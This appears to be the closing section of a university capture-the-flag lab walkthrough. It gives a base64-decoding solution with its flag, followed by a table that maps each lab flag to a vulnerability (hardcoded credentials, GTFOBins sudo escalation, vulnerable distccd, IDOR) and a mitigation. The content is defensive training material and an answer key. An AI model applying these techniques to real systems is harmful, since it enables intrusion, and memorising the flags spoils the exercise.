```bash
# Step 1 — Read data_dump.txt and spot the encoded line
curl http://<TARGET_IP>/public/data_dump.txt
# Look for the line ending in = near the bottom

# Step 2 — First decode
echo 'U0VJdFJVNURUMFJGTFRneE1qTT0=' | base64 -d
# Output: SEItRU5DT0RFLTgxMjM=

# Step 3 — Second decode
echo 'SEItRU5DT0RFLTgxMjM=' | base64 -d
# Output: HB-ENCODE-8123
```

**Flag:** `HB-ENCODE-8123`

**Real-world mitigation:** Encoding is not encryption. Base64 provides no security — it is trivially reversible. Use proper encryption (AES-256) with key management for data that must remain confidential.

</details>

---

## Real-World Mitigations Summary

Every vulnerability in this lab maps to a common enterprise misconfiguration. Here is the complete reference.

| Flag | Vulnerability Class | Mitigation |
|------|---------------------|------------|
| F01 | Information leakage via service banner | Sanitise SSH banners; remove internal identifiers |
| F02 | Sensitive path disclosure via robots.txt | Never list sensitive directories in robots.txt |
| F03 | Developer comment left in production HTML | Pre-deployment checklist; automated source scanning |
| F04 | Backup archive exposed in web root | Store backups outside web root; require authentication |
| F05 | Internal communications in deployment archive | DLP controls; audit archive contents before storage |
| F06 | Hardcoded credentials in config file | Use a secrets manager; rotate on exposure |
| F07 | Account not revoked on employee termination | Leaver checklist; immediate credential revocation |
| F08 | World-readable shell history with sensitive content | `chmod 600` on `.bash_history`; disable history for service accounts |
| F09 | Security misconfiguration documented in user-accessible file | Never document privilege rules in readable locations |
| F10 | Personal metadata embedded in shared files | Strip metadata before sharing; `exiftool -all= filename` |
| F11 | Malicious cron job for C2 persistence | FIM on `/etc/cron.d/`; SIEM alerting on cron changes |
| F12 | World-readable config file with credentials | `chmod 600` on all config files; secrets scanner in CI/CD |
| F13 | NOPASSWD sudo rule with GTFOBins binary | Remove NOPASSWD grants for GTFOBins binaries; quarterly sudoers audit |
| F14 | GTFOBins privilege escalation via find | AppArmor / SELinux profiles; remove dangerous sudo rules |
| F15 | Vulnerable service (distccd CVE-2004-2687) listening on all interfaces | Restrict ALLOWEDNETS; disable when not in use; patch or remove |
| F16 | Sensitive identity file in root directory | FIM on `/root/`; SIEM alerts for new file creation |
| F17 | Data tampering without integrity controls | FIM on data files; immutable backups with cryptographic verification |
| BF01 | Broken Access Control — URL-only restriction | Server-side RBAC on every endpoint |
| BF02 | Staging environment left on production server | Remove staging before deployment; separate hosts |
| BF03 | Internal script served over unauthenticated HTTP | Mutual TLS or token auth for internal endpoints |
| BF04 | Sensitive data in public web directory | Access controls matched to data classification |
| BF05 | Insecure Direct Object Reference (IDOR) | Server-side authorisation on every object reference |
| BF06 | Encoding mistaken for security | Use proper encryption; never rely on encoding for confidentiality |

---

*Operation: ZERO — TD03 CyberStorm | Murdoch University | March 2026*  
*For authorised training use only.*
